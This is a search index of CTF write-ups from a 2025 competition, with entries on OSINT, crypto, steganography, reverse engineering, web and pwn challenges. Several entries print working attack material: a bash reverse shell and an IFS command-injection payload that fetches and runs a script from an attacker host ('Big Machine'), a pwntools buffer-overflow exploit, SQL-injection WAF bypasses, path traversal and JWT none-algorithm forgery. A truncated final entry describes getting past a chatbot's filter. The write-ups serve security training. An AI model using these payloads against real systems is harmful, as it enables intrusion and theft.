[ { "title": "Around The World", "url": "/writeups/CyberConverge_2025/01-around-the-world.html", "categories": "OSINT", "tags": "", "date": "", "snippet": "Around the World Author: Aakansh Gupta (Unknown)This is a purley OSINT based CTF. Use tools like Google lens or Google EarthSince we know the flag starts with CBCV{XXXX} format, we try an search i...", "content": "Around the World Author: Aakansh Gupta (Unknown)This is a purley OSINT based CTF. Use tools like Google lens or Google EarthSince we know the flag starts with CBCV{XXXX} format, we try an search it.Image was taken from Google Earth: https://earth.google.com/web/@48.24320818,17.6841851,122.62258148a,0d,90y,113.92109797h,93.75353085t,0r/data=CgRCAggBIhoKFmEzZENqNGtRN3Y5TDJuMVhpR2NjTFEQAjoDCgEwQgIIAEoICJvNmbsHEAAThe flag would be:CBCV{trnava_slovakia}" }, { "title": "Big Machine", "url": "/writeups/CyberConverge_2025/02-Big-machine.html", "categories": "Pwn", "tags": "", "date": "", "snippet": "Big Machine Author: Aakansh Gupta (Unknown)Check the website on the given urlIt shows the pin result for given IPs.Try and get a reverse shell on it.Since most common commands are blocked, we try ...", "content": "Big Machine Author: Aakansh Gupta (Unknown)Check the website on the given urlIt shows the pin result for given IPs.Try and get a reverse shell on it.Since most common commands are blocked, we try and send a script from attacked to the machine like:#!/bin/bashbash -i &gt;&amp; /dev/tcp/192.168.192.130/4444 0&gt;&amp;1We craft a special request to send this: ` 8.8.8.8;curl${IFS}-o${IFS}/tmp/x${IFS}YOUR_ATTACKER_IP:8000/s;chmod${IFS}+x${IFS}/tmp/x;/tmp/x `We can use python http.server to send the file. At the same time keep the netcat listener open to accept the reverse shell.After getting a reverse shell, try snoop around to find the flag. If you check the enviornment variables using env , you get the flagThe flag found is:CBCV{3nv1r0nm3nt_v4r14bl3s_c4n_b3_s3cr3t_2352}" }, { "title": "Breach", "url": "/writeups/CyberConverge_2025/03-breach.html", "categories": "Misc", "tags": "", "date": "", "snippet": "Breach Author: Harsh Singh (DeadStar)Using steghide we can get the hidden file in the image.POPI{S14TVfUrer}The Actual aftering decoding it with rot13 cipher isFlag Reterived is:CBCV{F14GIsHere}", "content": "Breach Author: Harsh Singh (DeadStar)Using steghide we can get the hidden file in the image.POPI{S14TVfUrer}The Actual aftering decoding it with rot13 cipher isFlag Reterived is:CBCV{F14GIsHere}" }, { "title": "Cathedral", "url": "/writeups/CyberConverge_2025/04-Cathedral.html", "categories": "OSINT", "tags": "", "date": "", "snippet": "The CathedralA quick Google Image Search reveals the location: Notre Dame Cathedral, Nuku Hiva, French Polynesia.From there, we head over to Google Earth (or Google Maps), locate the site, and swit...", "content": "The CathedralA quick Google Image Search reveals the location: Notre Dame Cathedral, Nuku Hiva, French Polynesia.From there, we head over to Google Earth (or Google Maps), locate the site, and switch to Street View. The exact coordinates can be extracted directly from the URL in the browser.The flag found is:CBCV{-8.9103_-140.1026} OR CBCV{-8.9103_-140.1030}" }, { "title": "Easy Flag", "url": "/writeups/CyberConverge_2025/05-easy-file.html", "categories": "Web", "tags": "", "date": "", "snippet": "Easy Flag Author: Aakansh Gupta (Unknown)A simple web base path traversal vulnerability.Clicking on any on the links leads to a url like: http://20.244.12.130:50002/view?file=db_errors.logJust try...", "content": "Easy Flag Author: Aakansh Gupta (Unknown)A simple web base path traversal vulnerability.Clicking on any on the links leads to a url like: http://20.244.12.130:50002/view?file=db_errors.logJust try and change the view?file=db_errors.log to common paths like ../app.py or ../flag.txtVisiting http://20.244.12.130:50002/view?file=../flag.txt give:A string of hex numbers: ` 57 56 57 50 7b 6a 34 6e 42 5f 6e 6c 34 70 33 6c 6d 34 46 5f 70 38 66 48 5f 39 33 39 38 35 31 7d `Using CyberChef we can decode these to WVWP{j4nB_nl4p3lm4F_p8fH_939851}Using a ROT6 cypher we get: CBCV{p4tH_tr4v3rs4L_v8lN_939851}The flag found is:CBCV{p4tH_tr4v3rs4L_v8lN_939851}" }, { "title": "Hidden Layers", "url": "/writeups/CyberConverge_2025/06-Hidden-Layers.html", "categories": "steganography", "tags": "", "date": "", "snippet": "Hidden Layers Author: AmarnathInitial Steps Find Morse code. Convert to Base32. Apply ROT13. Remove EVEN Postion Alphabets.Further Solving and Steps# Step 1: USE Morse decoder&lt;img src=\"./im...", "content": "Hidden Layers Author: AmarnathInitial Steps Find Morse code. Convert to Base32. Apply ROT13. Remove EVEN Postion Alphabets.Further Solving and Steps# Step 1: USE Morse decoder&lt;img src=\"./images/morsedecoded1.png\" /&gt;# Step 2 &amp; 3: Base32 decode and ROT13&lt;img src=\"./images/from32baseandrot13.png\" /&gt;# Step 4:Remove Alphabets from EVEN PostionACBBCCDVE{FCGRHYIPJTK_LCM4NNO_PBQ3R_SLT4UYV3WRX5Y}ZFinal Flag reterived is:CBCV{CRYPT_C4N_B3_L4Y3R5}" }, { "title": "Who am I?", "url": "/writeups/CyberConverge_2025/07-whoamii.html", "categories": "Web", "tags": "", "date": "", "snippet": "Who am I? Author: Aakansh Gupta (Unknown)Simple JWT based ctf.Visit the given url and look for the cookie user .Decode it using tools like www.jwt.ioIt give the flag as \"sub\":\"CBCV{jWt_t0k3ns_us3...", "content": "Who am I? Author: Aakansh Gupta (Unknown)Simple JWT based ctf.Visit the given url and look for the cookie user .Decode it using tools like www.jwt.ioIt give the flag as \"sub\":\"CBCV{jWt_t0k3ns_us3d_34}\" The flag found is:CBCV{jWt_t0k3ns_us3d_34}" }, { "title": "I am Who?", "url": "/writeups/CyberConverge_2025/08-i_am_who.html", "categories": "Web", "tags": "", "date": "", "snippet": "I am Who? Author: Aakansh Gupta (Unknown)A longer version of it’s parent CTF who am i . This requires none Algorithm attack and secret key verification.Visit the given page and check the cookie.Th...", "content": "I am Who? Author: Aakansh Gupta (Unknown)A longer version of it’s parent CTF who am i . This requires none Algorithm attack and secret key verification.Visit the given page and check the cookie.This time we have an admin page.This requires elevated privilages.Use jwt.io to encode a cookie without any algorithm to bypass auth.This allows access to admin panel. But this isnt the end, we reqire another endpoint finalcheckAnd a new role called superadmin is needed.We can brute force common secret keys like secret or qwerty (in this case its qwerty).Using jwt.io we craft a cookie and send it.Now we can access the /finalcheck endpoint and see the flag.The flag found is:CBCV{w34K_S3Cr3T_K3y_Cr4CK3d_835}" }, { "title": "Intellectual Conversation", "url": "/writeups/CyberConverge_2025/09-inti-conv.html", "categories": "Misc", "tags": "", "date": "", "snippet": "Intellectual Conversation Author: AadhyanthEncoding:convert each character to ascii and insert \\u200b after that many charactersDecoding:find distance between 2 zero-width characters and convert t...", "content": "Intellectual Conversation Author: AadhyanthEncoding:convert each character to ascii and insert \\u200b after that many charactersDecoding:find distance between 2 zero-width characters and convert take chr()python code:def hide_flag_in_text(text, flag): zwsp = \"\\u200b\" result = \"\" flag_index = 0 char_count = 0 for ch in text: result += ch char_count += 1 # check if we've reached the ascii value position for current flag character if flag_index &lt; len(flag) and char_count == ord(flag[flag_index]): result += zwsp flag_index += 1 char_count = 0 # reset counter return resultdef decode_flag_from_text(encoded_text): char_count = 0 flag = \"\" for ch in encoded_text: if ch == '\\u200b': flag += chr(char_count) char_count = 0 else: char_count += 1 return flag# Usagehuge_text = \"\"\"TRANSCRIPT-1Discussion between Dr. Sarah Chen (Theoretical Physicist) and Prof. Marcus Rodriguez (Materials Science)......Prof. Rodriguez: Thank you, Sarah. I look forward to continuing this conversation as the field evolves.[End of Transcript]\"\"\"flag = \"CBCV{1nv151b1l1ty_0r_t1m3_c0ntr0l?}\"encoded_text = hide_flag_in_text(huge_text, flag)print(\"Encoded text:\")print(encoded_text)with open('transcript.txt', 'w', encoding='utf-8') as file: file.write(encoded_text) file.close()with open('transcript.txt', 'r', encoding = 'utf-8') as file: data = file.read() print(\"\\nDecoded flag:\") print(decode_flag_from_text(data))Output:Encoded text:Squeezed text (182 lines).The flag found is:CBCV{1nv151b1l1ty_0r_t1m3_c0ntr0l?}" }, { "title": "It ain't here", "url": "/writeups/CyberConverge_2025/10-itainthere.html", "categories": "Reverse engineering", "tags": "", "date": "", "snippet": "It ain’t here Author: Aakansh Gupta (Unknown)Lets first run the file and its properties┌──(kali㉿kali)-[~/Desktop/Cyscom/6]└─$ ./challenge.runVerifying archive integrity... 100% MD5 checksums ar...", "content": "It ain’t here Author: Aakansh Gupta (Unknown)Lets first run the file and its properties┌──(kali㉿kali)-[~/Desktop/Cyscom/6]└─$ ./challenge.runVerifying archive integrity... 100% MD5 checksums are OK. All good.Uncompressing It ain't here 100% Can you really break the pincode? ...Try if you must: Entering any wrong pin shows bad pin and exits the program. What we can try is “Keyboard Interrupt In Linux” by pressing ctrl+c during execution. This shows us the location of the executing python script.Can you really break the pincode? ...Try if you must: ^CTraceback (most recent call last): File \"/tmp/selfgz116517/./pin_checker.py\", line 105, in &lt;module&gt; main() File \"/tmp/selfgz116517/./pin_checker.py\", line 82, in main pin = input(\"Try if you must: \")KeyboardInterruptSignal caught, cleaning upBut visiting it after execution shows nothing. So we try and access it while executing the program. Here we find a python file with tons of flags.But what we need is the flag from this function:def generate_real_flag(pin): FLAG_PREFIX = \"CBCV{}\" hashed_pin = hashlib.blake2b((pin + \"blindinglights\").encode(\"utf-8\")).hexdigest()[:32] return FLAG_PREFIX % hashed_pinThis is called when entered pin is 98315. Use this to get the correct flag with the program.if pin == \"98315\": print(\"Looks good to me...\") print(\"I guess I'll generate a flag\") try: req = requests.get(\"http://example.com\", timeout=2) req.raise_for_status() except requests.exceptions.RequestException: print(\"Warning: Could not verify secondary network status.\") real_flag = generate_real_flag(pin) print(real_flag) else: print(\"Bad pin!\")The flag found is:CBCV{b07faa19997299630d615b1a9579d64f}" }, { "title": "Layers", "url": "/writeups/CyberConverge_2025/11-layers.html", "categories": "Cryptography", "tags": "", "date": "", "snippet": "Layers Author: Om MishraDescriptionThe challenge provides an encoded string. It is encrypted using a Caesar cipher with a shift of 7, then Base64 encoded.Steps to Solve Take the given encoded str...", "content": "Layers Author: Om MishraDescriptionThe challenge provides an encoded string. It is encrypted using a Caesar cipher with a shift of 7, then Base64 encoded.Steps to Solve Take the given encoded string: Q0JEVntrb3RyeX...} First, decode it from Base64. Next, apply a Caesar cipher decryption with shift = 19. You will get the final flag.FlagCBCV{cRy9T0_L4y3r5_4RE_FuN_3135}" }, { "title": "Locked", "url": "/writeups/CyberConverge_2025/12-locked.html", "categories": "Reverse engineering", "tags": "", "date": "", "snippet": "Locked Author: Aakansh Gupta (Unknown)Lets first run the file and its properties┌──(kali㉿kali)-[~/Desktop/Cyscom/5]└─$ ./challenge.run Verifying archive integrity... 100% Error in MD5 checksums:...", "content": "Locked Author: Aakansh Gupta (Unknown)Lets first run the file and its properties┌──(kali㉿kali)-[~/Desktop/Cyscom/5]└─$ ./challenge.run Verifying archive integrity... 100% Error in MD5 checksums: cd6432c66be8a7696954be1324b594cf is different from 6432c66be8a7696954be1324b594cfRunning the file tells us that there are errors in MD% checksums.If we try to match the hash using editors like VSCode or Nano (Non-hex editors), the file is corrupted.┌──(kali㉿kali)-[~/Desktop/Cyscom/5]└─$ ./challenge.run Verifying archive integrity... Unexpected archive size.To try and fix the MD5 Check, we need to use hex editors like hexedit. We know 2 in hex is 32 and 0 in hex is 30.Replace these values with the hexeditor where there are 0s.Now run the file again. We get the flag┌──(kali㉿kali)-[~/Desktop/Cyscom/5]└─$ ./challenge.run Verifying archive integrity... 100% MD5 checksums are OK. All good.Uncompressing Lost in the Wild 100% CBCV{h3x_3dIt0r5_t0_Th3_r3scU3_9364}The flag found is:CBCV{h3x_3dIt0r5_t0_Th3_r3scU3_9364}" }, { "title": "Look beyond what you see", "url": "/writeups/CyberConverge_2025/13-lbys.html", "categories": "misc", "tags": "", "date": "", "snippet": "Look beyond what you see Created by: P C Guhan (DaBot)Description Look beyond what you see (Change the brackets in the flag to {} when submitting)output.txtSolutionUpon opening the txt file in a ...", "content": "Look beyond what you see Created by: P C Guhan (DaBot)Description Look beyond what you see (Change the brackets in the flag to {} when submitting)output.txtSolutionUpon opening the txt file in a standard hex editor, we find that the file consists of only 3 characters - \\x00 (null), \\x20 (space) and \\xe2\\x80\\x8b (Zero Width Space). Here we substitute \\x00 as a space, \\x20 as ‘.’ and \\xe2\\x80\\x8b as ‘- and get the morse code encoded text. We then decode it to get the flag.Script:import redef substitute_morse_escaped(filename, output_filename): with open(filename, \"r\", encoding=\"utf-8\") as f: raw_text = f.read() decoded_bytes = raw_text.encode(\"utf-8\").decode(\"unicode_escape\").encode(\"latin1\") decoded_bytes = decoded_bytes.replace(b\"\\xe2\\x80\\x8b\", b\"-\") decoded_bytes = decoded_bytes.replace(b\"\\x20\", b\".\") decoded_bytes = re.sub(b'\\x00{3,}', b' ', decoded_bytes) decoded_bytes = re.sub(b'\\x00', b' ', decoded_bytes) morse_code = decoded_bytes.decode(\"utf-8\") with open(output_filename, \"w\", encoding=\"utf-8\") as out: out.write(morse_code)if __name__ == \"__main__\": substitute_morse_escaped( \"hexa.txt\", \"morse_output.txt\" )morse_output.txtFinal flag reterived:CBCV{MORSE_OR_REMORSE}" }, { "title": "Monoalphabetic Shenanigans", "url": "/writeups/CyberConverge_2025/14-monoal2.html", "categories": "cryptography", "tags": "", "date": "", "snippet": "Monoalphabetic Shenanigans Author: P C Guhan (DaBot)Description Looks Secure? Check againAdd the CBCV{flag} and underscores while submitting the flag (ALL CAPS)script_redacted.py:def __(_0, _1, _...", "content": "Monoalphabetic Shenanigans Author: P C Guhan (DaBot)Description Looks Secure? Check againAdd the CBCV{flag} and underscores while submitting the flag (ALL CAPS)script_redacted.py:def __(_0, _1, _2, _3): ___ = list(map(ord, _3)) ____ = (_0 &lt;&lt; 0) ^ (_1 &gt;&gt; 0) ^ (_1 - _1) _____ = (_1 ^ 0) * (_2 ^ 0) return [__import__(\"builtins\").pow(x, ____ or _0, _____) for x in ___]with open(\"plaintext.txt\", \"r\") as f: T = f.read().strip()p = REDACTEDq = REDACTEDe = 65537output = __(e, p, q, T)with open(\"output.txt\", \"w\") as f: f.write(str(output))output.txtSolutionHere, RSA is implemented by converting each letter to its ASCII value and then encrypting it. Hence each letter will have the same encrypted value. Since there are only 26 unique encoded numbers, we can map each cipertext to a letter. Once mapped, the cipertext needs to be replaced with the letter and then a frequency analysis can be run.A frequency analysis refers to the guessing of the correct cipertext based on the number of occurences of a letter in the text. This can be done using online tools.Script:import reimport stringdef read_encrypted(filename): with open(filename, \"r\") as f: content = f.read() return list(map(int, re.findall(r\"\\d+\", content)))def map_numbers_to_letters(encrypted_numbers): unique_numbers = sorted(set(encrypted_numbers)) if len(unique_numbers) &gt; 26: raise ValueError(f\"Too many unique numbers: {len(unique_numbers)} (max 26 allowed)\") letters = list(string.ascii_lowercase) mapping = {num: letter for num, letter in zip(unique_numbers, letters)} return mappingdef substitute_numbers_with_letters(encrypted_numbers, mapping): return \"\".join(mapping.get(num, \"?\") for num in encrypted_numbers)def main(): encrypted_file = \"output.txt\" decoded_file = \"test.txt\" encrypted_numbers = read_encrypted(encrypted_file) mapping = map_numbers_to_letters(encrypted_numbers) decoded_text = substitute_numbers_with_letters(encrypted_numbers, mapping) with open(decoded_file, \"w\") as f: f.write(decoded_text)if __name__ == \"__main__\": main()Output:test.txtThe we need to do frequency analysis on the output file i.e. test.txt.Upon doing frequency analysis using online resources. We get the frequency of each letter and the approximate substitution which will give us the desired result.This webiste: https://www.dcode.fr/frequency-analysis provides the ability to directly substitute the required letters and the gives the flag as FLAGFREQUENCYANALYSISFTW.Final flag reterived:CBCV{FREQUENCY_ANALYSIS_FTW}" }, { "title": "Mouse Trap", "url": "/writeups/CyberConverge_2025/15-mousetrap.html", "categories": "cyptography", "tags": "", "date": "", "snippet": "Mouse Trap Author: Akshaya HThe mouse is trapped inside the “system cheese” and we should save it, but how?connect to the server using: nc 20.244.12.130 50005The server starts the challange.Step 1...", "content": "Mouse Trap Author: Akshaya HThe mouse is trapped inside the “system cheese” and we should save it, but how?connect to the server using: nc 20.244.12.130 50005The server starts the challange.Step 1: Break the Secret LocksFirst, we had a SHA-256 hash and generally SHA-256 can be “decrypted”, using decoders.Use: https://www.dcode.fr/sha256-hashThis will give us the name of the cheese which they are trapped in.Then comes the Playfair cipher – an old-school pen-and-paper cipher where letters are scrambled using a 5×5 grid. We just needed to check if the given Playfair text matched the expected decrypted form.So basically: Encrypt the cheese name using Playfair message for the escape sequence. This is to crack the “LR Dance”For the Playfair Cipher,Use: https://encryptdecrypt.tools/tools/ciphers/playfair.phpOnce the cipher text was ready, we have to do the next trick:Odd-positioned letters - R (Right)Even-positioned letters - L (Left)This gives us a secret L/R sequence.Enter the sequence, which finally reveals the flag.Using this script, we can find the key.import hashlibimport randomimport stringdef sha256(x): return hashlib.sha256(x.encode()).hexdigest()def load_cheeses(filename=\"cheese.txt\"): with open(filename, \"r\") as f: cheeses = [line.strip() for line in f if line.strip()] return cheesesdef generate_playfair_key_matrix(key): key = key.upper().replace(\"J\", \"I\") matrix = [] used = set() for char in key: if char not in used and char in string.ascii_uppercase: matrix.append(char) used.add(char) for char in string.ascii_uppercase: if char == \"J\": # skip J continue if char not in used: matrix.append(char) used.add(char) return [matrix[i:i+5] for i in range(0, 25, 5)]def find_position(matrix, char): for r, row in enumerate(matrix): for c, val in enumerate(row): if val == char: return r, c return Nonedef playfair_encrypt(text, matrix): text = text.upper().replace(\"J\", \"I\") prepared = [] i = 0 while i &lt; len(text): a = text[i] b = \"\" if i+1 &lt; len(text): b = text[i+1] if a == b: b = \"X\" i += 1 else: i += 2 if b == \"\": b = \"X\" prepared.append((a, b)) cipher = \"\" for a, b in prepared: r1, c1 = find_position(matrix, a) r2, c2 = find_position(matrix, b) if r1 == r2: cipher += matrix[r1][(c1+1)%5] + matrix[r2][(c2+1)%5] elif c1 == c2: cipher += matrix[(r1+1)%5][c1] + matrix[(r2+1)%5][c2] else: cipher += matrix[r1][c2] + matrix[r2][c1] return cipherdef cipher_to_lr(cipher_text): sequence = \"\" for ch in cipher_text: if not ch.isalpha(): continue idx = ord(ch) - ord('A') + 1 if idx % 2 == 0: sequence += \"L\" else: sequence += \"R\" return sequencedef main(): print(\"🐭 Welcome to the Mouse &amp; Cheese Playfair Challenge! \") cheeses = load_cheeses(\"cheese.txt\") cheese = random.choice(cheeses) target_hash = sha256(cheese) print(\"\\nThe mouse whispers: 'Here’s the hash of my cheese...'\") print(\"Hash:\", target_hash) user_cheese = input(\"\\n🔍 Enter the cracked cheese word: \").strip() if user_cheese.lower() != cheese.lower(): print(\"Wrong cheese! The mouse stays trapped...\") return print(\"Correct cheese! Now, encrypt it with a cipher, Wheatstone's friend loved to play so much...\") matrix = generate_playfair_key_matrix(\"mousecheese\") cipher_text = playfair_encrypt(user_cheese.upper(), matrix) user_cipher = input(\"\\nEnter the Playfair ciphertext: \").strip().upper() if user_cipher != cipher_text: print(\"\\n[!] Wrong ciphertext! The mouse shakes its head...\") return print(\"\\n[+] Correct ciphertext! The mouse is impressed.\") print(\"\\n Clue for the final path:\") print(\" Oh, maybe the 'odd' ones are always 'left (L)' out in the list.\") print(\" And the rest all are 'right' to be split 'even'! \") print(\" Work it out, smartie! \") correct_lr = cipher_to_lr(cipher_text) print(correct_lr) user_lr = input(\"\\nEnter the full sequence: \").strip().upper() if user_lr == correct_lr: print(\"\\n CYBER{m0u$etr@p}\") else: print(\"\\n [!] Wrong sequence using L/R! The mouse laughs at your attempt...\")if _name_ == \"_main_\": main()The flag found is:CBCV{M0u23_7Ra95_DAng3r_5342}" }, { "title": "Mr. Robot", "url": "/writeups/CyberConverge_2025/16-mrrobot.html", "categories": "pwn", "tags": "", "date": "", "snippet": "Mr. Robot Author: Aakansh Gupta (Unknown)Classic Buffer Overflow CTF.Connecting to the server through netcat gives:┌──(kali㉿kali)-[~/Desktop/Cyscom/3]└─$ nc 20.244.12.130 50001Who is the leader of...", "content": "Mr. Robot Author: Aakansh Gupta (Unknown)Classic Buffer Overflow CTF.Connecting to the server through netcat gives:┌──(kali㉿kali)-[~/Desktop/Cyscom/3]└─$ nc 20.244.12.130 50001Who is the leader of fsociety? Enter your answer &gt; Any answer to this returns:┌──(kali㉿kali)-[~/Desktop/Cyscom/3]└─$ nc 20.244.12.130 50001Who is the leader of fsociety? Enter your answer &gt; Elliot AldersonYou aren't thinking straight Elliot!We try to decompile the file using decompilers like gdb and check breakpoints after entering a huge value:pwndbg&gt; runStarting program: /home/kali/Desktop/Cyscom/3/vuln [Thread debugging using libthread_db enabled]Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".Who is the leader of fsociety? Enter your answer &gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Program received signal SIGSEGV, Segmentation fault.Use this data to find the value overriden by the RIP register. Use ` cyclic -l 0x6161616b6161616a ` (for example only) to find offset vlaue with RIP register. Now find the ` win() ` function address within gdb using print win . Similarly, find the ret gadget using ` ROPgadget –binary ./vuln –only “ret” ` outside gdb.We are using a pwntools exploit script to automatically run and get the flag from the server using the values we found.from pwn import *context.arch = 'amd64'offset = 72win_address = 0x4011b6ret_gadget = 0x401016p = remote(\"20.244.12.130\", 50001)payload = b'A' * offset + p64(ret_gadget) + p64(win_address)log.info(f\"Payload: {payload}\")p.recvuntil(b'&gt; ')p.sendline(payload)p.interactive()Running the script produces the output as the required flag.The flag found is:CBCV{BuFf3r_0v3rF10W_1s_s1mpL3_9713}" }, { "title": "My hostel room key", "url": "/writeups/CyberConverge_2025/17-mhrk.html", "categories": "misc", "tags": "", "date": "", "snippet": "My hostel room key Author: K S Vignesh Decode the key given in the text file 3 times using Base64 to get a decrypted string. You will find a Google Drive link — follow it. You w...", "content": "My hostel room key Author: K S Vignesh Decode the key given in the text file 3 times using Base64 to get a decrypted string. You will find a Google Drive link — follow it. You will get a PDF there; go to the last page and you will find another Google Drive link to download an image. Download the image and open it using Notepad. There you will see a flag-like text inside curly brackets, but it is not the final flag (you’re almost there). Decode the string present inside the curly brackets 6 times using Base64. You will get the final answer, which should be placed inside curly brackets. FLAG: CBCV{FINAL_FLAG}" }, { "title": "Passz CheckS", "url": "/writeups/CyberConverge_2025/18-passcheckz.html", "categories": "Reverse Engineering", "tags": "", "date": "", "snippet": "Passz CheckSChallenge DescriptionYou are given a password checker program which is encrypted through an algorithm, decipher,decomipiler and decode the file to find the passwordInspect binary file a...", "content": "Passz CheckSChallenge DescriptionYou are given a password checker program which is encrypted through an algorithm, decipher,decomipiler and decode the file to find the passwordInspect binary file and Locate custom alphabet and encoded flagstrings password_checker | grep -E \"(Correct!|Wrong!|Usage:|[A-Za-z0-9+/]{10,})\" Locate XOR key (12 bytes)xxd password_checker | grep -A2 -B2 \"0a0b 0c0dLocate expected-hash bytes (0x7a repeated)grep -a -b -o \"zzzz\" password_checker xxd password_checker | sed -n '94,96p' Compute password from key and target byte 0x7apython3 - &lt;&lt;'PY' xor_key = [0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14,0x15] expected = 0x7A password = ''.join(chr(expected ^ b) for b in xor_key) print(password) PYRetrieve flag./password_checker \"pqvwtujkhino\" Final flag is:CBCV{CiCaDAzznotz141}" }, { "title": "Polyglot", "url": "/writeups/CyberConverge_2025/19-polyglot.html", "categories": "web", "tags": "", "date": "", "snippet": "Polyglot Author: PrithviIn this challenge, we are given a single endpoint behind a WAF:http://20.244.12.130:8092/submitThe WAF blocks common SQL injection patterns (like OR, AND, UNION) and reject...", "content": "Polyglot Author: PrithviIn this challenge, we are given a single endpoint behind a WAF:http://20.244.12.130:8092/submitThe WAF blocks common SQL injection patterns (like OR, AND, UNION) and rejects malformed JSON. Our goal is to craft a payload that passes the WAF and retrieves the flag.Step 1: Test basic inputWe start by sending a normal JSON string:curl -s -X POST http://20.244.12.130:8092/submit \\-H \"Content-Type: application/json\" \\-d '{\"payload\":\"test\"}'Expected response:{ \"status\": \"ok\", \"received_normalized\": \"test\" } This confirms the endpoint accepts valid JSON and returns a normalized version of our payload. Malformed JSON triggers:{ \"error\": \"invalid json\" }Step 2: Probe the WAFNext, we try simple SQLi strings:curl -s -X POST http://20.244.12.130:8092/submit \\-H \"Content-Type: application/json\" \\-d '{\"payload\":\"admin' or '1'='1\"}'Output:{ \"error\": \"blocked: sqli\" } This indicates the WAF blocks literal OR. Other attempts like AND, UNION, or -- are similarly blocked.Step 3: Find a bypass techniqueWe observe that: The WAF uses simple regex word-boundary checks (blocks literal keywords). The endpoint accepts JSON input, meaning we can inject characters inside the string.Idea: use an inline SQL comment to split the keyword:o/**/r OR is now broken across o/**/r → WAF regex does not match. The payload is still valid JSON and may normalize internally on the hidden server.Step 4: Test polyglot payloadWe construct the candidate payload:curl -s -X POST http://20.244.12.130:8092/submit \\-H \"Content-Type: application/json\" \\-d '{\"payload\":\"admin' o/**/r '1'='1\"}' Variations with spacing inside the comment are also tested:admin' o/**/ r '1'='1admin' o/**/r '1'='1 All variations are valid polyglot payloads: Pass WAF Normalize internally to a hidden target string Trigger flag return Step 5: Analyze responses Payloads blocked by WAF return {\"error\":\"blocked: sqli\"} Malformed JSON returns {\"error\":\"invalid json\"} Correct polyglot returns:{ \"flag\": \"CBCV{0n3_p4Yl0AD_2_w0rLd5_4545}\" } Only polyglot-style payloads of this type work. Any naive attempt like \"admin' or '1'='1\" fails due to WAF.Step 6: Summary Challenge concept: input interpreted in two contexts (JSON + SQL) WAF protection: blocks common SQL keywords Solution: craft a polyglot payload that: Is valid JSON Uses inline comments or other tricks to bypass regex Normalizes to the hidden server’s expected string # Conceptual normalization inside hidden serverpayload = \"admin' o/**/r '1'='1\"normalized = payload.replace(\"/**/\", \"\").strip().lower()# normalized == \"admin' or '1'='1\"The flag found is:CBCV{0n3_p4Yl0AD_2_w0rLd5_4545}" }, { "title": "RSA Hard", "url": "/writeups/CyberConverge_2025/20-rsa_hard.html", "categories": "cyptography", "tags": "", "date": "", "snippet": "RSA Hard Author: Om MishraChallenge (what participant gets)You are given:n = 5860838794991910814284665112683385463954646048771125316431872432348926417447e1 = 17e2 = 65537c1 = 372047712281233021039...", "content": "RSA Hard Author: Om MishraChallenge (what participant gets)You are given:n = 5860838794991910814284665112683385463954646048771125316431872432348926417447e1 = 17e2 = 65537c1 = 3720477122812330210392570666622835188001585746013783461634956703564926609316c2 = 2374066440947720297446444451505697411347728841883956859393928588819879545418Recover the original plaintext (ASCII) and submit it as the flag.Hints gcd(e1, e2) = 1 → find integers a,b such that a*e1 + b*e2 = 1. Use: m = (c1^a * c2^b) mod n. For negative exponents, use modular inverses. Convert integer m → bytes → ASCII.Walkthrough Compute extended gcd to get a, b with a*e1 + b*e2 = 1. Compute part1 = c1^a (mod n) (handle negative a via inverse). Compute part2 = c2^b (mod n) (handle negative b). m = (part1 * part2) % n. Convert m to bytes → that is the flag.Expected flag (hidden): CBCV{cryptanalysis}Reference solver# solver_rsa_common.py# Pure-Python solver for RSA common modulus challenge.def egcd(a, b): if b == 0: return a, 1, 0 g, x1, y1 = egcd(b, a % b) return g, y1, x1 - (a // b) * y1def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise ValueError(\"No inverse\") return x % mdef modexp_with_signed_exponent(base, exp, mod): if exp &gt;= 0: return pow(base, exp, mod) inv = modinv(base, mod) return pow(inv, -exp, mod)n = 322373040362292717649168841216788477297e1 = 17e2 = 65537c1 = 12755149773111262113925394772571626614c2 = 199765691046492609176467359736241258709g, a, b = egcd(e1, e2)if g != 1: raise SystemExit(\"e1 and e2 are not coprime\")print(\"Found coefficients a, b:\", a, b)part1 = modexp_with_signed_exponent(c1, a, n)part2 = modexp_with_signed_exponent(c2, b, n)m = (part1 * part2) % n# convert int -&gt; bytesdef int_to_bytes(x): if x == 0: return b'\\x00' length = (x.bit_length() + 7) // 8 return x.to_bytes(length, 'big')pt = int_to_bytes(m)print(\"Recovered bytes:\", pt)print(\"Recovered string:\", pt.lstrip(b'\\x00').decode('utf-8'))Final flag recovered is:CBCV{cryptanalysis}" }, { "title": "SnarkyGPT", "url": "/writeups/CyberConverge_2025/21-snarkygpt.html", "categories": "misc", "tags": "", "date": "", "snippet": "SnarkyGPT CTF Challenge WalkthroughStep 1: Trying Basic StuffLike any hacker, you start with common commands: ls → “u think wandering around works?” whoami → “Someone lost their identity? ” give...", "content": "SnarkyGPT CTF Challenge WalkthroughStep 1: Trying Basic StuffLike any hacker, you start with common commands: ls → “u think wandering around works?” whoami → “Someone lost their identity? ” give me flag → “Imagine thinking politeness unlocks secrets.”Nothing useful. Just mockery.Step 2: Forbidden WordsCertain words instantly trigger strikes: flag, password, secret, exploit, etc.SnarkyGPT responds with warnings like: “Forbidden incantation detected.” “Oops. You just triggered a tripwire.”After 3 strikes, you get baited with a fake flag:CBCV{nice_try_but_this_is_fake}And the session locks. No recovery without refreshing.Step 3: Finding the RitualEventually you notice some phrases actually progress the challenge instead of roasting you.Example: i am stupid → “Heh… that’s embarrassing, but it moved something.”You realize this is part of a multi-stage humiliation sequence.Step 4: Stage ProgressionThe ritual has four stages. Stage 1 - Self-roast Trigger: i am stupid OR me stupid Response: “Heh… that’s 